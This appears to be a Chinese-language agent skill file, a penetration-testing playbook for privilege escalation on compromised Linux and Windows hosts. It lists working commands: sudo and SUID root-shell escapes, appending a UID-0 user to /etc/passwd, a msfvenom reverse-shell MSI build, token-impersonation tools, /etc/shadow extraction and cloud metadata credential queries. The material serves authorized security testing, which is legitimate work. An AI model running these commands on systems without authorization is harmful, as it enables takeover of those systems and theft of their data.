---
name: cszh-performing-privilege-escalation-assessment
description: 在已入侵的 Linux 和 Windows 系统上执行权限提升评估，识别从低权限访问到 root 或 SYSTEM 级别控制的路径。 测试人员枚举错误配置、存在漏洞的服务、内核漏洞、SUID 二进制文件、未加引号的服务路径和凭据存储， 以演示初始入侵的完整影响。适用于权限提升测试、本地漏洞利用、后渗透提权或操作系统级安全评估等请求场景。
---

> 来源：killvxk/cybersecurity-skills-zh 上游技能 `performing-privilege-escalation-assessment`，正文为中文原文照录（仅剥离上游 frontmatter）。
> 定位：执行权限提升评估。
> 用法：按正文的「工作流程 / 命令清单 / 输出格式」执行；本技能在 dsh 中的名字是 cszh-performing-privilege-escalation-assessment。

# 执行权限提升评估

## 使用场景

- 在渗透测试中获得低权限初始访问后，演示完整的系统入侵
- 评估 Linux 和 Windows 服务器对本地权限提升攻击的安全加固情况
- 评估端点检测与响应（EDR）工具是否能检测到常见的权限提升技术
- 测试最小权限策略和应用白名单在端点上的有效性
- 验证容器逃逸和虚拟机逃逸控制是否配置正确

**不适用场景**：未获得书面授权、针对可能导致停机的生产系统进行利用，或在未获事先批准和回滚能力的系统上部署内核漏洞利用。

## 前置条件

- 通过授权手段获得目标系统的低权限 shell 访问（反向 shell、SSH、RDP）
- 权限提升枚举脚本：linPEAS（Linux）、winPEAS（Windows）、Linux Smart Enumeration（LSE）
- 常见 CVE 的编译好的内核漏洞利用，或目标上的编译工具访问权限
- GTFOBins 参考（用于 Linux SUID/sudo 二进制滥用）和 LOLBAS 参考（用于 Windows 离地攻击二进制文件）
- 若目标上无法编译，需准备目标架构的预编译后渗透二进制文件

## 工作流程

### 步骤一：系统枚举

收集目标系统的全面信息：

**Linux 枚举：**
- `id && whoami` — 当前用户和组成员身份
- `uname -a` — 内核版本（用于识别内核漏洞利用）
- `cat /etc/os-release` — 发行版和版本
- `sudo -l` — 当前用户可通过 sudo 以 root 身份运行的命令
- `find / -perm -4000 -type f 2>/dev/null` — SUID 二进制文件
- `find / -perm -2000 -type f 2>/dev/null` — SGID 二进制文件
- `crontab -l && ls -la /etc/cron*` — 以 root 身份运行的定时任务
- `ps aux | grep root` — 以 root 身份运行的进程
- `cat /etc/passwd` — 用户账户（查找 UID 为 0 的其他用户）
- `find / -writable -type d 2>/dev/null` — 全局可写目录
- 运行 `linpeas.sh` 进行自动化全面枚举

**Windows 枚举：**
- `whoami /priv` — 当前用户权限（查找 SeImpersonatePrivilege、SeDebugPrivilege）
- `systeminfo` — 操作系统版本、补丁级别、架构
- `wmic service get name,pathname,startmode` — 未加引号的服务路径
- `icacls "C:\Program Files" /T` — Program Files 中的可写目录
- `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` — AlwaysInstallElevated 检查
- `cmdkey /list` — 存储的 Windows 凭据
- `schtasks /query /fo LIST /v` — 计划任务及其运行账户
- 运行 `winPEAS.exe` 进行自动化全面枚举

### 步骤二：Linux 权限提升向量

系统地测试已识别的提升向量：

- **sudo 错误配置**：若 `sudo -l` 显示如 `(ALL) NOPASSWD: /usr/bin/vim` 的条目，使用 GTFOBins 提权：
  - `sudo vim -c ':!/bin/bash'` 生成 root shell
  - 常见危险 sudo 条目：vim、less、find、nmap、python、perl、ruby、awk、env
- **SUID 二进制滥用**：若发现允许任意命令执行、shell 逃逸或文件读取的 SUID 二进制：
  - 自定义 SUID：检查自定义 SUID 二进制是否调用没有绝对路径的其他程序（PATH 注入）
  - 已知 SUID：在 GTFOBins 中查找标准 SUID 二进制的利用方式
- **定时任务利用**：若定时任务运行当前用户可写的脚本，或从可写目录运行脚本：
  - 修改脚本以添加反向 shell 或 SUID 版本的 bash
  - 基于 PATH 的定时任务利用：若定时任务调用没有绝对路径的命令且 PATH 可写
- **内核漏洞利用**：将内核版本与已知漏洞匹配：
  - DirtyPipe（CVE-2022-0847）：Linux 内核 5.8-5.16.11
  - DirtyCow（CVE-2016-5195）：Linux 内核 2.6.22-4.8.3
  - PwnKit（CVE-2021-4034）：影响大多数 Linux 发行版的 Polkit pkexec 漏洞
- **能力（Capabilities）滥用**：`getcap -r / 2>/dev/null` 查找具有提升能力的二进制文件（cap_setuid、cap_dac_override）
- **可写的 /etc/passwd**：若 /etc/passwd 可写，添加新的 root 用户：`echo 'newroot:$1$hash:0:0::/root:/bin/bash' >> /etc/passwd`

### 步骤三：Windows 权限提升向量

测试 Windows 特定的提升路径：

- **令牌冒充（Token Impersonation）**：若用户拥有 `SeImpersonatePrivilege`（服务账户和 IIS 常见）：
  - 使用 `JuicyPotato.exe`、`PrintSpoofer.exe` 或 `GodPotato.exe` 冒充 SYSTEM
  - `PrintSpoofer.exe -i -c "cmd /c whoami"` -> `NT AUTHORITY\SYSTEM`
- **未加引号的服务路径**：若服务路径带空格且未加引号（如 `C:\Program Files\My App\service.exe`），且可写入中间目录：
  - 在 `C:\Program Files\My.exe` 放置恶意可执行文件，服务重启时将执行
- **可写的服务二进制文件**：若可修改以 SYSTEM 身份运行的服务可执行文件：
  - 用反向 shell 替换二进制文件，然后重启服务
- **AlwaysInstallElevated**：若 HKLM 和 HKCU 的 AlwaysInstallElevated 注册表键均设为 1：
  - 生成恶意 MSI：`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o shell.msi`
  - 以提升权限安装：`msiexec /quiet /qn /i shell.msi`
- **存储的凭据**：检查 `cmdkey /list`、AutoLogon 注册表键、unattend.xml、web.config 文件和 PowerShell 历史记录中的凭据
- **DLL 劫持**：识别从可写目录加载 DLL 的服务。使用 Process Monitor 查找缺失的 DLL 加载，然后放置恶意 DLL
- **计划任务**：查找以 SYSTEM 身份运行且脚本或二进制文件可写的任务

### 步骤四：容器与云环境提权

测试容器化和云环境中的提升路径：

- **Docker 逃逸**：检查容器是否以特权模式运行（`--privileged`）、是否挂载了 Docker socket（`/var/run/docker.sock`）或具有 `SYS_ADMIN` 能力
- **Kubernetes Pod 提权**：检查具有 cluster-admin 权限的服务账户令牌、hostPID/hostNetwork 命名空间或 hostPath 卷挂载
- **云元数据**：从已入侵主机访问云实例元数据（`http://169.254.169.254/latest/meta-data/`），发现 IAM 角色、凭据和实例信息
- **IAM 角色滥用**：若发现云凭据，枚举 IAM 权限并通过 IAM 策略操控测试权限提升

### 步骤五：文档记录与影响评估

记录完整的提权路径和业务影响：

- 记录提权过程中执行的每条命令（含时间戳）
- 捕获提升访问权限的证明（whoami 显示 root/SYSTEM，访问受限文件）
- 记录在提升权限级别下可访问的数据或系统
- 将提升技术映射到 MITRE ATT&CK（T1548 — 滥用提升控制机制，T1068 — 利用漏洞进行权限提升）
- 为每个已识别的提升向量提供具体修复方案

## 核心概念

| 术语 | 定义 |
|------|------------|
| **SUID 二进制** | 设置了 Set User ID 位的 Linux 二进制文件，无论谁运行它，都以文件所有者（通常是 root）的权限执行 |
| **SeImpersonatePrivilege** | 允许进程冒充其他用户安全令牌的 Windows 权限，服务账户常滥用此权限提升至 SYSTEM |
| **内核漏洞利用** | 针对操作系统内核漏洞的利用程序，可获取 ring-0 或 root/SYSTEM 级别访问权限 |
| **GTFOBins** | Unix 二进制文件的精选列表，在错误配置时可用于权限提升、文件读写或 shell 逃逸 |
| **LOLBAS** | 离地攻击二进制文件和脚本；合法的 Windows 二进制文件，可被滥用于代码执行、文件操作或持久化 |
| **DLL 劫持** | 利用 Windows 上的 DLL 搜索顺序，通过在合法 DLL 位置之前搜索的目录放置恶意 DLL |
| **令牌冒充** | Windows 技术，具有适当权限的已入侵进程捕获并使用其他用户的访问令牌，以该用户身份执行命令 |

## 工具与系统

- **linPEAS / winPEAS**：自动化权限提升枚举脚本，检查 Linux 和 Windows 上数百个潜在提升向量
- **GTFOBins / LOLBAS**：Unix 二进制文件和 Windows 二进制文件的参考数据库，错误配置时可用于权限提升
- **PrintSpoofer / GodPotato**：Windows 权限提升工具，利用 `SeImpersonatePrivilege` 从服务账户实现 SYSTEM 级访问
- **Linux Exploit Suggester**：将目标内核版本与已知内核漏洞数据库进行比较，识别适用漏洞利用的脚本

## 常见场景

### 场景：Linux Web 服务器上的权限提升

**背景**：在渗透测试中，测试人员通过 PHP 文件上传漏洞在 Ubuntu 22.04 Web 服务器上以 `www-data` 身份获得了低权限 shell。目标是提升至 root 以演示完整的服务器入侵。

**方法**：
1. 运行 `linpeas.sh`，发现 `www-data` 可通过 sudo 无需密码以 root 身份运行 `/usr/bin/find`
2. 通过 `sudo -l` 确认：`(root) NOPASSWD: /usr/bin/find`
3. 在 GTFOBins 中查找 `find` 的 sudo 条目：`sudo find . -exec /bin/bash -p \; -quit`
4. 执行命令获得 root shell
5. 以 root 身份访问 `/etc/shadow` 提取密码哈希，从应用配置文件读取数据库凭据，并访问包含客户 PII 的 MySQL 数据库
6. 记录：以 www-data 初始访问 -> sudo 错误配置 -> root shell -> 数据库访问 -> 75,000 条客户记录可被访问

**常见陷阱**：
- 未在类似系统上测试就运行内核漏洞利用，有导致内核崩溃和系统宕机的风险
- 不检查容器环境，其中表面上的 root 访问可能仅限于容器命名空间
- 忽视从已入侵主机可访问的云元数据端点，这些端点可能提供 IAM 凭据
- 在检查 sudo 后未枚举能力和 SUID 二进制文件，遗漏替代提升路径

## 输出格式

```
## 发现：sudo 错误配置允许通过 find 提升至 root

**ID**: PRIV-001
**严重性**: 严重（CVSS 8.8）
**受影响主机**: web-prod-01（10.10.5.15）
**操作系统**: Ubuntu 22.04 LTS
**初始访问**: www-data（通过 PHP 文件上传 — WEB-004）
**提升技术**: MITRE ATT&CK T1548.003 — sudo 和 sudo 缓存

**描述**:
/etc/sudoers 配置允许 www-data 用户无需密码以 root 身份执行 /usr/bin/find。
find 命令支持 -exec 标志，可生成 root shell，实际上赋予 www-data 不受限制的 root 访问权限。

**概念验证**:
www-data@web-prod-01:~$ sudo -l
(root) NOPASSWD: /usr/bin/find
www-data@web-prod-01:~$ sudo find . -exec /bin/bash -p \; -quit
root@web-prod-01:~# id
uid=0(root) gid=0(root) groups=0(root)

**影响**:
对生产 Web 服务器的完整 root 访问权限。测试人员以 root 身份从
/var/www/app/.env 获取了数据库凭据，连接到 MySQL，并确认可读取
包含姓名、邮件和地址的 75,000 条客户记录。

**修复建议**:
1. 移除 www-data 的 /usr/bin/find sudo 条目
2. 若确需 find 访问权限，通过 --no-exec 将其限制在特定目录
3. 审计所有 sudo 条目，检查 GTFOBins 中列出的二进制文件
4. 使用 auditd 为所有特权命令执行实施 sudo 日志记录
```
